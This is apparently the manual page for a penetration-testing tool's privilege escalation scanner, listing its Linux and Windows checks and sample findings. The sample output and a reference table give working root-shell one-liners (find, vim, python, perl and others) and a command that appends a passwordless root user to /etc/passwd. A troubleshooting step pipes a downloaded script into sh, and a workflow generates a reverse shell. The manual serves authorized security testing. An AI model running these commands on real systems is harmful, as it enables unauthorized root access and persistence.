# Privilege Escalation Scanner

Scan for privilege escalation vectors on local system.

## Quick Start

```bash
# Basic privilege escalation scan
rb exploit payload privesc

# JSON output for automation
rb exploit payload privesc -o json
```

## Command

### privesc - Privilege Escalation Scanner

Scan the local system for privilege escalation vectors.

```bash
rb exploit payload privesc [flags]
```

## Options

```rust
// Privilege escalation options
struct PrivescOptions {
    // Output format
    // Values: "text", "json", "yaml"
    // Default: "text"
    output: String,
}
```

## Flag Reference

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--output` | `-o` | Output format | text |

## Linux Checks

### SUID/SGID Binaries

| Check | Description |
|-------|-------------|
| SUID files | Files with setuid bit |
| GTFOBins | Known exploitable binaries |
| Custom SUID | Non-standard SUID binaries |

### Sudo Configuration

| Check | Description |
|-------|-------------|
| NOPASSWD | Passwordless sudo entries |
| Wildcards | Exploitable wildcard patterns |
| Environment | Preserved environment variables |

### System Misconfigurations

| Check | Description |
|-------|-------------|
| Writable paths | Writable dirs in $PATH |
| Cron jobs | Weak cron permissions |
| World-writable | Files in /etc |
| SSH keys | Weak key permissions |
| Docker socket | Exposed Docker socket |
| Capabilities | Binary capabilities |

## Windows Checks

### Service Vulnerabilities

| Check | Description |
|-------|-------------|
| Unquoted paths | Unquoted service paths |
| Weak permissions | Modifiable services |
| DLL hijacking | Missing DLLs |

### Registry Keys

| Check | Description |
|-------|-------------|
| AlwaysInstallElevated | MSI elevation |
| Autologon | Stored credentials |
| Run keys | Startup programs |

### Token Privileges

| Check | Description |
|-------|-------------|
| SeImpersonate | Potato attacks |
| SeDebug | Debug privilege |
| SeBackup | Backup privilege |

## Examples

### Basic Scan

```bash
# Scan local system
rb exploit payload privesc

# JSON output
rb exploit payload privesc -o json
```

## Output Examples

### Text Output

```
AUTHORIZED USE ONLY

Privilege Escalation Scanner

Scanning for privilege escalation vectors... ✓

Found 4 potential vectors

CRITICAL (2 vectors)
  • SUID Binary - /usr/bin/find with SUID bit
    Find binary can be used to execute commands with elevated privileges
    Exploit: find . -exec /bin/bash -p \; -quit
    Reference: https://gtfobins.github.io/gtfobins/find/

  • Sudo Misconfiguration - NOPASSWD on /usr/bin/vim
    User can run vim as root without password
    Exploit: sudo vim -c ':!/bin/bash'
    Reference: https://gtfobins.github.io/gtfobins/vim/

HIGH (1 vector)
  • Writable /etc/passwd - World-writable password file
    /etc/passwd has weak permissions (666)
    Exploit: echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd

MEDIUM (1 vector)
  • Kernel Exploit - Linux 5.4.0 (outdated)
    Kernel version may be vulnerable to known exploits

Next Steps:
  1. Verify findings manually
  2. Check GTFOBins for SUID exploitation
  3. Search for kernel exploits: searchsploit 5.4.0
```

### JSON Output

```json
{
  "total_vectors": 4,
  "critical": 2,
  "high": 1,
  "medium": 1,
  "vectors": [
    {
      "severity": "critical",
      "category": "SUID Binary",
      "title": "/usr/bin/find with SUID bit",
      "description": "Find binary can execute commands with elevated privileges",
      "exploit_technique": "find . -exec /bin/bash -p \\; -quit",
      "references": ["https://gtfobins.github.io/gtfobins/find/"]
    },
    {
      "severity": "critical",
      "category": "Sudo Misconfiguration",
      "title": "NOPASSWD on /usr/bin/vim",
      "description": "User can run vim as root without password",
      "exploit_technique": "sudo vim -c ':!/bin/bash'",
      "references": ["https://gtfobins.github.io/gtfobins/vim/"]
    }
  ]
}
```

## Common GTFOBins

| Binary | Technique |
|--------|-----------|
| find | `find . -exec /bin/bash -p \; -quit` |
| vim | `sudo vim -c ':!/bin/bash'` |
| less | `sudo less /etc/passwd` then `!/bin/bash` |
| nmap | `sudo nmap --interactive` then `!sh` |
| python | `sudo python -c 'import os; os.system("/bin/bash")'` |
| perl | `sudo perl -e 'exec "/bin/bash"'` |

## Patterns

### Post-Exploitation Workflow

```bash
# Step 1: Scan for vectors
rb exploit payload privesc

# Step 2: If SUID found, check GTFOBins
# https://gtfobins.github.io/

# Step 3: If kernel vulnerable, search exploits
searchsploit linux 5.4

# Step 4: Generate shell for elevated access
rb exploit payload shell --type python --lhost 10.10.10.10
```

### Automated Analysis

```bash
# Export findings
rb exploit payload privesc -o json > privesc.json

# Check for critical vectors
cat privesc.json | jq '.vectors[] | select(.severity == "critical")'
```

## Troubleshooting

### No Vectors Found

```bash
# Run LinPEAS for deeper analysis
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

### False Positives

```bash
# Verify SUID manually
ls -la /path/to/binary

# Test if actually exploitable
# Follow GTFOBins instructions carefully
```

## Next Steps

- [Reverse Shells](/domains/exploit/02-shells.md) - Generate payloads
- [Lateral Movement](/domains/exploit/03-lateral.md) - Movement techniques
- [Configuration](/domains/exploit/05-configuration.md) - Exploit settings
